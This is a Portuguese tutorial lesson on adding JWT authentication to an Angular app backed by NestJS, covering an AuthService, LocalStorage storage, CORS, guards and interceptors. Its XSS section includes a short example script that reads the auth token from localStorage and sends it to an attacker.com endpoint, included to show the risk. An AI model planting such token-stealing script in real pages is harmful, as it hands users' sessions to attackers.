# 📘 Aula 4 — Autenticação e Integração com Backend

**Progresso do Curso Frontend:** `[█████░░░░░░░░░░░░░░░] 26% concluído`

## Objetivo

Integrar a tela de login com o backend NestJS, implementando autenticação completa com JWT, configuração de CORS e armazenamento seguro de tokens.

---

## 🎯 O que vamos construir

- **Sistema de Autenticação JWT**: Login com email/senha → Recebe token JWT → Armazena no LocalStorage
- **AuthService**: Serviço centralizado para gerenciar autenticação  
- **JWT Decode**: Extração de dados do usuário do token
- **CORS no Backend**: Permitir requisições do frontend
- **LocalStorage Helper**: Abstração type-safe para persistência
- **Guards & Interceptors**: Proteção de rotas e injeção automática de token

💡 **Na próxima aula**, substituiremos os `alert()` por um sistema de Snackbar profissional.

---

## 📋 Conceitos Importantes

### JWT vs Session-based Auth

| Aspecto | JWT (Stateless) | Session (Stateful) |
|---------|-----------------|---------------------|
| **Armazenamento** | Cliente (LocalStorage/Cookie) | Servidor (memória/Redis) |
| **Escalabilidade** | ✅ Fácil (sem estado no servidor) | ❌ Difícil (sincronizar sessões) |
| **Performance** | ✅ Sem consulta ao banco | ⚠️ Lookup em cada request |
| **Revogação** | ❌ Difícil (token vive até expirar) | ✅ Fácil (deleta sessão) |
| **Payload** | ✅ Carrega dados do usuário | ❌ Só ID da sessão |
| **Tamanho** | ⚠️ Maior (token longo) | ✅ Menor (session ID) |
| **Ideal para** | **APIs REST, microserviços, mobile** | Apps monolíticos tradicionais |

**Nossa escolha**: **JWT** porque:
- ✅ Backend stateless (fácil escalar horizontalmente)
- ✅ Funciona bem com SPA (Angular)
- ✅ Não precisa Redis/memcache para sessões
- ✅ Dados do usuário no token (menos queries ao banco)

---

### Anatomia de um JWT

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

```
┌─────────────────────┬──────────────────────────┬─────────────────┐
│      Header         │         Payload          │    Signature    │
│   (Algorithm)       │      (User Data)         │   (Verification)│
└─────────────────────┴──────────────────────────┴─────────────────┘
```

**Decodificando o Payload (nossa implementação):**
```json
{
  "sub": "uuid-do-usuario",      // Subject (ID do usuário)
  "email": "user@example.com",
  "name": "Nome do Usuário",
  "iat": 1516239022,              // Issued at (timestamp)
  "exp": 1516242622               // Expiration (timestamp)
}
```

**Por que decodificar no frontend?**
- ✅ Extrair dados do usuário sem fazer nova requisição ao backend
- ✅ Exibir nome/email no UI sem chamar `/me` endpoint
- ✅ Verificar expiração localmente

⚠️ **Importante**: Decodificar ≠ Validar. Backend sempre valida a assinatura!

---

### LocalStorage vs Cookies vs SessionStorage

| Storage | Persistência | Capacidade | HTTP-only | Acesso JS | Quando usar |
|---------|--------------|------------|-----------|-----------|-------------|
| **LocalStorage** | Até limpar manualmente | ~10MB | ❌ Não | ✅ Sim | **Dados de longo prazo** (settings, cache) |
| **SessionStorage** | Até fechar aba | ~10MB | ❌ Não | ✅ Sim | Dados temporários (wizard, draft) |
| **Cookies** | Configurável (max-age) | ~4KB | ✅ Sim | ⚠️ Depende | **Autenticação (produção)** |

**Nossa escolha (desenvolvimento)**: **LocalStorage**
- ✅ Simples de implementar
- ✅ Persiste entre sessões (não precisa logar sempre)
- ✅ Capacidade maior que cookies

**Produção (recomendação)**: **HttpOnly Cookies**
- ✅ **JavaScript não pode acessar** (seguro contra XSS)
- ✅ Auto-send em requisições (não precisa header manual)
- ✅ Flags Secure/SameSite (previne CSRF)

---

### Segurança: XSS e Token Storage

**XSS (Cross-Site Scripting):**

Script malicioso injetado na página para roubar dados:

```html
<!-- Ataque XSS -->
<div>
  {{userInput}}  <!-- Se contiver <script>, executa! -->
</div>
```

**Risco com LocalStorage:**
```javascript
// Script malicioso pode roubar token
const token = localStorage.getItem('token');
fetch('https://attacker.com/steal', { 
  method: 'POST', 
  body: token 
});
```

**Mitigação:**

| Abordagem | Proteção | Trade-off |
|-----------|----------|-----------|
| **HttpOnly Cookies** | ✅ JS não acessa | ❌ Precisa CSRF protection |
| **Content Security Policy** | ✅ Bloqueia scripts externos | ⚠️ Configuração complexa |
| **Sanitização de inputs** | ✅ Previne XSS | ✅ Angular sanitiza por padrão |

**Angular proteção nativa:**
```typescript
// ✅ Angular sanitiza automaticamente
<div>{{ userInput }}</div>  // <script> vira texto puro

// ❌ Bypass (só use se tiver certeza!)
<div [innerHTML]="userInput"></div>  // Pode executar scripts
```

---

### Fluxo de Autenticação (Diagrama)

```
┌──────────┐                    ┌──────────┐                    ┌──────────┐
│ Frontend │                    │ Backend  │                    │ Database │
│ (Angular)│                    │ (NestJS) │                    │ (SQLite) │
└────┬─────┘                    └────┬─────┘                    └────┬─────┘
     │                               │                               │
     │ 1. POST /auth/login           │                               │
     │   { email, password }         │                               │
     ├──────────────────────────────►│                               │
     │                               │ 2. Busca usuário              │
     │                               ├──────────────────────────────►│
     │                               │                               │
     │                               │◄──────────────────────────────┤
     │                               │ 3. user encontrado            │
     │                               │                               │
     │                               │ 4. bcrypt.compare(password)   │
     │                               │    ✅ Senha válida            │
     │                               │                               │
     │                               │ 5. JwtService.sign(payload)   │
     │                               │    → Gera token JWT           │
     │                               │                               │
     │  6. { access_token: "eyJh..."}│                               │
     │◄──────────────────────────────┤                               │
     │                               │                               │
     │ 7. jwt-decode(access_token)   │                               │
     │    → Extrai { sub, name, email }                              │
     │                               │                               │
     │ 8. LocalStorage.setItem(...)  │                               │
     │    - TOKEN                    │                               │
     │    - USER                     │                               │
     │                               │                               │
     │ 9. Navigate to /ponies        │                               │
     │                               │                               │
     ▼                               ▼                               ▼
```

**Próximas requisições:**
```
┌──────────┐                    ┌──────────┐
│ Frontend │                    │ Backend  │
└────┬─────┘                    └────┬─────┘
     │                               │
     │ GET /ponies                   │
     │ Header: Authorization:        │
     │   Bearer eyJhbGc...           │
     ├──────────────────────────────►│
     │                               │ JwtStrategy valida token
     │                               │ ✅ Token válido
     │                               │
     │  { ponies: [...] }            │
     │◄──────────────────────────────┤
     ▼                               ▼
```

---

## 📋 Pré-requisitos

- Backend NestJS rodando (aula de backend concluída)
- Aula 3 concluída (tela de login criada)

---

## 📦 1. Instalar Dependências

Vamos instalar a biblioteca para decodificar tokens JWT:

```bash
cd web
npm install jwt-decode
```

---

## 📦 2. Criar Models no Frontend

### 2.1 Criar Interface de User

**src/app/core/models/user.model.ts**

```typescript
export interface User {
  id: string;
  name: string;
  email: string;
}

export interface LoginRequest {
  email: string;
  password: string;
}

export interface LoginResponse {
  access_token: string;
  user: User;
}

export interface ErrorResponse {
  statusCode?: number;
  message: string;
  error?: string;
}
```

**💡 Explicação:**
- `User`: Dados básicos do usuário (id, name, email)
- `LoginRequest`: Dados necessários para login
- `LoginResponse`: Resposta após login bem-sucedido (token + user decodificado)
- `ErrorResponse`: Formato de erro da API

### 📝 Explicação dos Models

**1. Por que separar interfaces?**

```typescript
// ❌ Sem separação (difícil reusar)
function login(email: string, password: string): Promise<any>

// ✅ Com interfaces (type-safe, reusável)
function login(data: LoginRequest): Observable<LoginResponse>
```

**Vantagens:**
- ✅ **Type-safety**: TypeScript valida em compile-time
- ✅ **Documentação**: Interfaces servem como contrato
- ✅ **Refatoração**: Mudar interface atualiza tudo
- ✅ **Autocomplete**: IDE sugere propriedades

**2. ErrorResponse estruturado:**

Segue o padrão do NestJS:
```json
{
  "statusCode": 401,
  "message": "Unauthorized",
  "error": "Invalid credentials"
}
```

Permite tratamento específico:
```typescript
if (error.statusCode === 401) {
  // Credenciais inválidas
} else if (error.statusCode === 500) {
  // Erro do servidor
}
```

---

## 🛠️ 3. Criar Helper de LocalStorage

### 3.1 LocalStorage Helper

**src/app/core/helpers/local-storage.helper.ts**

```typescript
export enum LocalStorageKeys {
    TOKEN = 'pony_auth_token',
    USER = 'pony_user',
}

export class LocalStorageHelper {
    static set<T>(key: LocalStorageKeys, value: T): void {
        try {
            const serialized = JSON.stringify(value);
            localStorage.setItem(key, serialized);
        } catch (error) {
            console.error('Error saving to localStorage:', error);
        }
    }

    static get<T>(key: LocalStorageKeys): T | null {
        try {
            const item = localStorage.getItem(key);
            return item ? JSON.parse(item) : null;
        } catch (error) {
            console.error('Error reading from localStorage:', error);
            return null;
        }
    }

    static remove(key: LocalStorageKeys): void {
        try {
            localStorage.removeItem(key);
        } catch (error) {
            console.error('Error removing from localStorage:', error);
        }
    }

    static clear(): void {
        try {
            localStorage.clear();
        } catch (error) {
            console.error('Error clearing localStorage:', error);
        }
    }
}
```

### 📝 Explicação do LocalStorage Helper

**1. Enum para chaves:**
```typescript
export enum LocalStorageKeys {
    TOKEN = 'pony_auth_token',
    USER = 'pony_user',
}
```
- **Por quê?** Evita typos: `TOKEN` vs `"token"` vs `"toke n"`
- **Type-safe**: IDE acusa erro se usar chave inválida
- **Refatorável**: Mudar uma vez, afeta tudo

**2. Generics para type-safety:**
```typescript
static set<T>(key: LocalStorageKeys, value: T): void
static get<T>(key: LocalStorageKeys): T | null
```
- **`<T>`**: Generic type (define o tipo em tempo de uso)
- **Type-safe**: `get<User>(TOKEN)` retorna `User | null`
- **Autocomplete**: IDE sabe quais propriedades tem no retorno

**Exemplo:**
```typescript
// ❌ Sem generics (tipo any)
const user = LocalStorageHelper.get('user');
console.log(user.name);  // ❌ Erro em runtime se user for null

// ✅ Com generics (type-safe)
const user = LocalStorageHelper.get<User>(LocalStorageKeys.USER);
if (user) {
  console.log(user.name);  // ✅ TypeScript garante que name existe
}
```

**3. Try-catch para robustez:**
```typescript
try {
  const serialized = JSON.stringify(value);
  localStorage.setItem(key, serialized);
} catch (error) {
  console.error('Error saving to localStorage:', error);
}
```

**Por quê?**
- **LocalStorage pode estar desabilitado** (modo privado, configurações)
- **Quota excedida** (~10MB)
- **JSON.stringify pode falhar** (circular references)

**4. Serialização automática:**
```typescript
JSON.stringify(value)  // Objeto → String
JSON.parse(item)       // String → Objeto
```

LocalStorage só aceita strings:
```javascript
// ❌ Direto (salva "[object Object]")
localStorage.setItem('user', { name: 'Test' });

// ✅ Serializado (salva JSON válido)
localStorage.setItem('user', JSON.stringify({ name: 'Test' }));
```

---

## 🔐 4. Criar Serviço de Autenticação

### 4.1 AuthService

**src/app/core/services/auth.service.ts**

```typescript
import { Injectable } from '@angular/core';
import { HttpClient } from '@angular/common/http';
import { Observable, catchError, throwError, map } from 'rxjs';
import { LoginRequest, LoginResponse, User } from '@core/models/user.model';
import { LocalStorageHelper } from '@core/helpers/local-storage.helper';
import { LocalStorageKeys } from '@core/helpers/local-storage.helper';
import { jwtDecode } from 'jwt-decode';

@Injectable({
    providedIn: 'root',
})
export class AuthService {
    private apiUrl = 'http://localhost:3000';

    constructor(private http: HttpClient) {}

    login(loginData: LoginRequest): Observable<LoginResponse> {
        return this.http.post<{ access_token: string }>(`${this.apiUrl}/auth/login`, loginData).pipe(
            map(({ access_token }) => {
                // Decodificar o JWT para extrair os dados do usuário
                const data = jwtDecode<User & { sub: string }>(access_token);

                const user = {
                    id: data.sub,
                    email: data.email,
                    name: data.name,
                };

                // Salvar token e usuário no localStorage
                if (access_token && data) {
                    LocalStorageHelper.set<string>(LocalStorageKeys.TOKEN, access_token);
                    LocalStorageHelper.set<User>(LocalStorageKeys.USER, user);
                }

                return {
                    access_token,
                    user,
                };
            }),
            catchError((error) => {
                return throwError(() => error);
            }),
        );
    }

    logout(): void {
        LocalStorageHelper.remove(LocalStorageKeys.TOKEN);
        LocalStorageHelper.remove(LocalStorageKeys.USER);
    }

    getToken(): string | null {
        return LocalStorageHelper.get<string>(LocalStorageKeys.TOKEN);
    }

    getUser(): User | null {
        return LocalStorageHelper.get<User>(LocalStorageKeys.USER);
    }

    isAuthenticated(): boolean {
        return !!this.getToken();
    }
}
```

**💡 Explicação:**
- **Backend retorna apenas `{ access_token }`**: O usuário não vem na resposta
- **jwtDecode**: Decodifica o token JWT para extrair os dados do usuário
- **map ao invés de tap**: Transformamos a resposta antes de retorná-la
- **Payload do JWT**: Contém `sub` (user.id), `email` e `name`
- **LocalStorage**: Salvamos token e usuário decodificado
- **Retorno**: Construímos manualmente o `LoginResponse` com token + user

---

## 🔧 5. Configurar CORS no Backend

### 5.1 Adicionar CORS no main.ts

**api/src/main.ts**

```typescript
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';
import { DocumentBuilder, SwaggerModule } from '@nestjs/swagger';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Habilitar CORS para permitir requisições do frontend
  app.enableCors({
    origin: 'http://localhost:4200', // URL do frontend Angular
    credentials: true,
  });

  const config = new DocumentBuilder()
    .setTitle('Pony Collection API')
    .setDescription('API para gerenciar coleção de poneis')
    .setVersion('1.0')
    .addBearerAuth()
    .build();

  const document = SwaggerModule.createDocument(app, config);
  SwaggerModule.setup('swagger', app, document);

  await app.listen(process.env.PORT ?? 3000);
}

bootstrap();
```

**💡 Importante:** Reinicie o servidor do backend após essa alteração!

```bash
# No terminal do backend
cd api
npm run start:dev
```

---

## 🔄 6. Integrar Login com AuthService

**src/app/features/auth/pages/login/login.component.ts**

```typescript
import { Component, signal, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { Router } from '@angular/router';
import { AuthService } from '@core/services/auth.service';
import { LoginRequest } from '@core/models/user.model';
import { PonyButtonComponent } from '@app/shared/components/pony-button/pony-button.component';
import { PonyInputComponent } from '@app/shared/components/pony-input/pony-input.component';

@Component({
    selector: 'app-login',
    standalone: true,
    imports: [CommonModule, FormsModule, PonyButtonComponent, PonyInputComponent],
    templateUrl: './login.component.html',
    styleUrl: './login.component.scss',
})
export class LoginComponent {
    email = signal('');
    password = signal('');
    isLoading = signal(false);

    private authService = inject(AuthService);
    private router = inject(Router);

    onSubmit(): void {
        if (!this.email() || !this.password()) {
            alert('Por favor, preencha todos os campos');
            return;
        }

        this.isLoading.set(true);

        const loginData: LoginRequest = {
            email: this.email(),
            password: this.password(),
        };

        this.authService.login(loginData).subscribe({
            next: (response) => {
                this.isLoading.set(false);

                if (response.access_token && response.user) {
                    console.log('Login bem-sucedido!', response);
                    this.router.navigate(['/ponies']);
                } else {
                    alert('Erro ao fazer login. Tente novamente!');
                }
            },
            error: (error) => {
                this.isLoading.set(false);
                console.error('Erro ao fazer login:', error);

                if (error.error?.message) {
                    alert(error.error.message);
                } else if (error.status === 401) {
                    alert('Email ou senha inválidos!');
                } else {
                    alert('Ocorreu um erro durante a requisição!');
                }
            },
        });
    }

    updateEmail(value: string): void {
        this.email.set(value);
    }

    updatePassword(value: string): void {
        this.password.set(value);
    }
}
```

**💡 Mudanças:**
- Injetamos `AuthService`
- Chamamos a API real com `authService.login()`
- Usamos `alert()` temporário para feedback (será substituído pelo sistema de Snackbar na **Aula 5**)
- Navegamos para `/ponies` em caso de sucesso
- Token e usuário são salvos automaticamente no localStorage

---

## 🧪 7. Testar a Integração

### 7.1 Criar Usuário de Teste (via Swagger)

1. Abra `http://localhost:3000/swagger`
2. Vá em `/users` → POST
3. Crie um usuário:

```json
{
  "name": "Teste User",
  "email": "teste@email.com",
  "password": "123456"
}
```

### 7.2 Testar Login

1. Abra `http://localhost:4200`
2. Digite o email e senha criados
3. Clique em "Login"
4. Verifique:
   - Loading aparece no botão
   - Alert aparece com sucesso
   - Token é salvo no localStorage (inspecione no devtools)
   - Redirecionamento acontece
   - Console mostra o log da resposta

---

## 🛡️ 8. Criar Guard de Autenticação (Opcional)

**src/app/core/guards/auth.guard.ts**

```typescript
import { inject } from '@angular/core';
import { Router, CanActivateFn } from '@angular/router';
import { AuthService } from '@core/services/auth.service';

export const authGuard: CanActivateFn = () => {
    const authService = inject(AuthService);
    const router = inject(Router);

    if (authService.isAuthenticated()) {
        return true;
    }

    router.navigate(['/login']);
    return false;
};
```

**Usar no app.routes.ts:**

```typescript
import { authGuard } from '@core/guards/auth.guard';

export const routes: Routes = [
    {
        path: 'ponies',
        component: PoniesComponent,
        canActivate: [authGuard] // Proteger rota
    },
    // ... outras rotas
];
```

---

## 🎯 9. Interceptor HTTP (Opcional)

Para adicionar automaticamente o token nas requisições:

**src/app/core/interceptors/auth.interceptor.ts**

```typescript
import { HttpInterceptorFn } from '@angular/common/http';
import { inject } from '@angular/core';
import { AuthService } from '@core/services/auth.service';

export const authInterceptor: HttpInterceptorFn = (req, next) => {
    const authService = inject(AuthService);
    const token = authService.getToken();

    if (token) {
        req = req.clone({
            setHeaders: {
                Authorization: `Bearer ${token}`
            }
        });
    }

    return next(req);
};
```

**Configurar no app.config.ts:**

```typescript
import { provideHttpClient, withInterceptors } from '@angular/common/http';
import { authInterceptor } from '@core/interceptors/auth.interceptor';

export const appConfig: ApplicationConfig = {
  providers: [
    // ... outros providers
    provideHttpClient(withInterceptors([authInterceptor]))
  ]
};
```

---

## 🎓 Conceitos Avançados

### 1. RxJS: map() vs tap() Operators

**Nossa implementação usa `map()`:**
```typescript
return this.http.post<{ access_token: string }>(endpoint, loginData).pipe(
  map(({ access_token }) => {
    const data = jwtDecode<User>(access_token);
    LocalStorageHelper.set(TOKEN, access_token);
    return { access_token, user: data };  // ✅ Transforma resposta
  })
);
```

**Alternativa com `tap()` (side-effect):**
```typescript
return this.http.post<LoginResponse>(endpoint, loginData).pipe(
  tap(response => {
    LocalStorageHelper.set(TOKEN, response.access_token);  // ⚠️ Side-effect
  })
);
```

**Comparação:**

| Operator | Propósito | Retorna | Quando usar |
|----------|-----------|---------|-------------|
| **map()** | **Transformar** dados | Novo valor | ✅ Decodificar JWT, reformatar resposta |
| **tap()** | **Side-effect** (log, save) | Mesmo valor | Console.log, analytics, cache |

**Por que usamos map()?**
- Backend retorna só `{ access_token }`
- Precisamos adicionar `user` decodificado
- `map()` permite transformar a resposta

---

### 2. JWT Decode vs JWT Verify

| Aspecto | jwt-decode (Frontend) | jsonwebtoken (Backend) |
|---------|----------------------|------------------------|
| **Função** | Decodificar payload | Verificar assinatura |
| **Segurança** | ⚠️ Não valida! | ✅ Valida signature |
| **Uso** | Exibir dados no UI | Autenticar requisições |
| **Biblioteca** | `jwt-decode` | `@nestjs/jwt` |

**Frontend (jwt-decode):**
```typescript
const decoded = jwtDecode<User>(token);
// ⚠️ Confia no token (não verifica signature)
// Só use para UI, nunca para lógica crítica
```

**Backend (jwt verify):**
```typescript
const decoded = this.jwtService.verify(token);
// ✅ Valida assinatura com chave secreta
// ✅ Verifica expiração
// ✅ Garante que token não foi alterado
```

**Fluxo de segurança:**
```
Frontend                      Backend
────────                      ───────
jwt-decode(token)             jwt.verify(token)
→ Extrai dados                → Valida assinatura
→ Exibe UI                    → Autoriza acesso
⚠️ Não confiável              ✅ Confiável
```

---

### 3. Functional Injection vs Constructor Injection

**Constructor Injection (tradicional):**
```typescript
export class LoginComponent {
  constructor(
    private authService: AuthService,
    private router: Router
  ) {}
}
```

**Functional Injection (Angular 14+):**
```typescript
export class LoginComponent {
  private authService = inject(AuthService);
  private router = inject(Router);
}
```

**Comparação:**

| Aspecto | Constructor | inject() |
|---------|-------------|----------|
| **Sintaxe** | ⚠️ Verboso | ✅ Conciso |
| **Herança** | ❌ Complexo (super()) | ✅ Simples |
| **Testabilidade** | ✅ Fácil mock | ✅ Fácil mock |
| **Functional programming** | ❌ | ✅ Alinha com signals |

**Vantagens do inject():**
- ✅ Menos boilerplate
- ✅ Composable (pode chamar em funções)
- ✅ Alinha com a direção moderna do Angular (signals, control flow)

---

### 4. Guards: CanActivate vs CanActivateFn

**Class-based Guards (antigo):**
```typescript
@Injectable()
export class AuthGuard implements CanActivate {
  constructor(
    private authService: AuthService,
    private router: Router
  ) {}
  
  canActivate(): boolean {
    if (this.authService.isAuthenticated()) {
      return true;
    }
    this.router.navigate(['/login']);
    return false;
  }
}
```

**Functional Guards (Angular 14+, nossa escolha):**
```typescript
export const authGuard: CanActivateFn = () => {
  const authService = inject(AuthService);
  const router = inject(Router);
  
  if (authService.isAuthenticated()) {
    return true;
  }
  router.navigate(['/login']);
  return false;
};
```

**Comparação:**

| Aspecto | Class Guards | Functional Guards |
|---------|--------------|-------------------|
| **Código** | ~15 linhas | ~8 linhas |
| **DI** | Constructor | inject() |
| **Testabilidade** | ✅ Boa | ✅ Melhor (funções puras) |
| **Composição** | ❌ Difícil | ✅ Fácil (combinar guards) |

---

### 5. Interceptors HTTP

**O que são?**

Middleware que intercepta **todas** as requisições HTTP:

```typescript
export const authInterceptor: HttpInterceptorFn = (req, next) => {
  const token = inject(AuthService).getToken();
  
  if (token) {
    req = req.clone({
      setHeaders: { Authorization: `Bearer ${token}` }
    });
  }
  
  return next(req);  // Continua requisição
};
```

**Fluxo:**
```
Component → HttpClient → [Interceptor] → Backend
                             ↓
                    Adiciona header Authorization
```

**Casos de uso comuns:**

| Uso | Código |
|-----|--------|
| **Auth token** | `setHeaders: { Authorization: Bearer ${token} }` |
| **Loading global** | `loadingService.show(); return next(req).pipe(finalize(() => loadingService.hide()))` |
| **Retry em erro** | `return next(req).pipe(retry(3))` |
| **Cache** | `if (cached) return of(cached); return next(req)` |
| **Log** | `console.log(req.url); return next(req)` |

---

### 6. CORS: Preflight Requests

**O que é CORS?**

**Cross-Origin Resource Sharing**: Política de segurança que controla requisições entre domínios diferentes:

```
http://localhost:4200  →  http://localhost:3000
   (Frontend)                (Backend)
   
   ❌ Bloqueado sem CORS  
   ✅ Permitido com CORS
```

**Preflight Request (OPTIONS):**

Antes de POST/PUT/DELETE, navegador faz OPTIONS para verificar permissões:

```http
OPTIONS /auth/login HTTP/1.1
Origin: http://localhost:4200
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type
```

**Backend responde:**
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://localhost:4200
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
```

**Nossa configuração:**
```typescript
app.enableCors({
  origin: 'http://localhost:4200',  // Apenas frontend
  credentials: true                  // Permite cookies
});
```

**Produção (mais restritivo):**
```typescript
app.enableCors({
  origin: ['https://app.example.com'],  // Lista whitelist
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
  maxAge: 3600  // Cache preflight por 1h
});
```

---

### 7. JWT Expiration & Refresh Tokens

**Problema:**

JWT tem expiração curta (ex: 15min) por segurança:
```json
{
  "exp": 1516242622,  // Token expira rapidamente
  "sub": "user-id"
}
```

**Solução: Refresh Token Pattern**

```
┌──────────┐                    ┌──────────┐
│ Frontend │                    │ Backend  │
└────┬─────┘                    └────┬─────┘
     │                               │
     │ 1. POST /auth/login           │
     ├──────────────────────────────►│
     │                               │
     │  2. access_token (15min)      │
     │     refresh_token (7 days)    │
     │◄──────────────────────────────┤
     │                               │
     │ 3. GET /ponies                │
     │    Bearer access_token        │
     ├──────────────────────────────►│
     │                               │ ✅ Token válido
     │◄──────────────────────────────┤
     │                               │
     │ ... 16min depois ...          │
     │                               │
     │ 4. GET /ponies                │
     │    Bearer access_token (expirado)
     ├──────────────────────────────►│
     │                               │ ❌ 401 Unauthorized
     │◄──────────────────────────────┤
     │                               │
     │ 5. POST /auth/refresh         │
     │    { refresh_token }          │
     ├──────────────────────────────►│
     │                               │ Valida refresh_token
     │  6. novo access_token         │
     │◄──────────────────────────────┤
     │                               │
     │ 7. Retry GET /ponies          │
     │    Bearer novo_access_token   │
     ├──────────────────────────────►│
     ▼                               ▼
```

**Implementação (não coberta neste curso, mas importante conhecer):**

```typescript
// Interceptor que detecta 401 e faz refresh
export const refreshTokenInterceptor: HttpInterceptorFn = (req, next) => {
  return next(req).pipe(
    catchError(error => {
      if (error.status === 401) {
        // Chamar /auth/refresh
        // Retry requisição original
      }
      return throwError(() => error);
    })
  );
};
```

---

### 8. Security Best Practices

| Prática | Implementação | Status |
|---------|---------------|--------|
| **HTTPS em produção** | `Secure` flag em cookies | ⚠️ Necessário |
| **HttpOnly cookies** | Backend define cookie HttpOnly | ⚠️ Recomendado |
| **SameSite flag** | `SameSite=Strict` | ⚠️ Previne CSRF |
| **Short-lived tokens** | `expiresIn: '15m'` | ✅ Implementado (backend) |
| **Refresh tokens** | Endpoint `/auth/refresh` | ❌ Não implementado |
| **XSS protection** | Angular sanitiza por padrão | ✅ Nativo |
| **CSRF tokens** | Necessário com cookies | ❌ LocalStorage não precisa |
| **Content Security Policy** | Headers HTTP | ⚠️ Recomendado produção |

**Checklist para produção:**
- [ ] Migrar de LocalStorage para HttpOnly Cookies
- [ ] Implementar refresh token
- [ ] Configurar CSP headers
- [ ] Rate limiting no backend
- [ ] Log de tentativas de login falhas
- [ ] Two-factor authentication (2FA)

---

## 📦 Resumo dos Arquivos Criados/Modificados

| Arquivo | Ação | Responsabilidade |
|---------|------|------------------|
| `user.model.ts` | ✨ CRIADO | Interfaces de User, Login(Request/Response), Error |
| `local-storage.helper.ts` | ✨ CRIADO | Abstração type-safe para LocalStorage |
| `auth.service.ts` | ✨ CRIADO | Gerenciamento de autenticação (login, logout, getUser) |
| `auth.guard.ts` | ✨ CRIADO | Proteção de rotas privadas |
| `auth.interceptor.ts` | ✨ CRIADO | Injeção automática de token em requests |
| `login.component.ts` | ✏️ MODIFICADO | Integração com AuthService |
| `api/src/main.ts` | ✏️ MODIFICADO | Configuração de CORS |
| `app.config.ts` | ✏️ MODIFICADO | Configuração de interceptors |

---

## 🎯 Checklist de Conclusão

- ✅ jwt-decode instalado
- ✅ Models TypeScript criados (User, LoginRequest, LoginResponse)
- ✅ LocalStorage Helper implementado com generics
- ✅ AuthService criado com decodificação JWT
- ✅ CORS configurado no backend
- ✅ Login integrado com backend real
- ✅ Token e usuário persistidos no LocalStorage
- ✅ Guard de autenticação criado
- ✅ Interceptor HTTP implementado
- ✅ Tratamento básico de erros (alert temporário)
- ✅ Navegação pós-login funcionando

---

## 📚 Resumo

Nesta aula você aprendeu:

✅ Instalar e usar `jwt-decode` para trabalhar com JWT  
✅ Configurar CORS no backend NestJS  
✅ Criar models TypeScript para API  
✅ Implementar LocalStorage helper para persistência  
✅ Criar AuthService com decodificação de JWT  
✅ Integrar login com backend real  
✅ Extrair dados do usuário do token JWT  
✅ Gerenciar tokens JWT no frontend  
✅ Criar guards de autenticação  
✅ Implementar interceptors HTTP  
✅ Tratar erros de API básico (alert temporário)  
✅ Diferenças entre JWT e Session-based Auth  
✅ Segurança: XSS, LocalStorage vs Cookies  
✅ RxJS operators (map vs tap)  
✅ Functional injection e guards

---

## 🎓 Conceitos Aprendidos

- **CORS**: Cross-Origin Resource Sharing
- **JWT**: JSON Web Tokens para autenticação
- **jwt-decode**: Biblioteca para decodificar tokens JWT no frontend
- **JWT Payload**: Estrutura dos dados dentro do token (sub, email, name)
- **RxJS map**: Operador para transformar dados em Observables
- **Observables**: RxJS para chamadas assíncronas
- **Guards**: Proteção de rotas
- **Interceptors**: Middleware para requisições HTTP
- **LocalStorage**: Persistência de dados no navegador
- **Signals**: Reatividade moderna do Angular
- **Functional Injection**: inject() vs constructor
- **Security**: XSS, CSRF, HttpOnly cookies

---

## 📚 Referências

- [JWT.io](https://jwt.io/)
- [Angular HttpClient](https://angular.io/guide/http)
- [RxJS Operators](https://rxjs.dev/api)
- [Angular Guards](https://angular.io/guide/router#preventing-unauthorized-access)
- [Angular Interceptors](https://angular.io/guide/http#intercepting-requests-and-responses)
- [OWASP Security Guide](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

---

## 📝 Próximos Passos

Na próxima aula (**Aula 5**), vamos implementar o **Sistema de Feedback com Snackbar** para substituir os `alert()` temporários por notificações elegantes e modernas:
- Criar SnackbarService com Signals
- Implementar componente visual com animações
- Tipos de mensagens (success, error, info)
- Auto-dismiss configurável
- Integração global no app
- Substituir alerts do login por snackbars
